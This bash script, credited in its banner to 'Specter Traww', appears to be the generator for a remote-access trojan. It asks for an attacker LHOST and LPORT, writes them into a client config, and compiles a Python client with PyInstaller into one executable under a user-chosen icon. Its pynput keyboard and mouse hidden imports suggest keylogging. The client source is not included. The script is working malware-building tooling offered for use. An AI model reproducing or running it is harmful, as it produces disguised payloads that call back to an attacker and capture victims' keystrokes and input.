#!/bin/bash 

function banner(){
	clear
	echo -e '''\e[1;32m
        ##  ## ##  ##         ###### ##  ##  
 #####  ##  ## ### ##   ##### ##     ### ##  
 ##  ## ##  ## ######  ##  ## ####   ######  
 ##  ## ###### ## ###  ##  ## ##     ## ###  
 #####  ###### ##  ##   ##### ##     ##  ##  
 ##     ##  ## ##  ##      ## ###### ##  ##v.1.1
 ##                    #####
 \e[1;35mcoded by Specter Traww - @spectertraww
 \e[0m'''                 
}

function main(){
	banner
	read -ep $'
\e[1;36m┌──(\e[1;34mpwnhawk㉿pwngen\e[1;36m)-[\e[1;37mPAYLOAD NAME\e[1;36m]
└─\e[1;34m$\e[0m ' payload_name


read -ep $'
\e[1;36m┌──(\e[1;34mpwnhawk㉿pwngen\e[1;36m)-[\e[1;37mLHOST\e[1;36m]
└─\e[1;34m$\e[0m ' lhost

read -ep $'
\e[1;36m┌──(\e[1;34mpwnhawk㉿pwngen\e[1;36m)-[\e[1;37mLPORT\e[1;36m]
└─\e[1;34m$\e[0m ' lport

read -ep $'
\e[1;36m┌──(\e[1;34mpwnhawk㉿pwngen\e[1;36m)-[\e[1;37mICON\e[1;36m]
└─\e[1;34m$\e[0m ' icon


echo lhost = "'$lhost'" > client/data.py
echo lport = $lport >> client/data.py

pyinstaller client/client.py --onefile --icon=$icon  --hidden-import=pynput.keyboard._xorg --hidden-import=pynput.mouse._xorg --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32

mv dist/client $payload_name
rm -rf dist/ build/
rm client.spec

echo -e "\e[1;32m Payload was successifully created\e[0m"

}

main
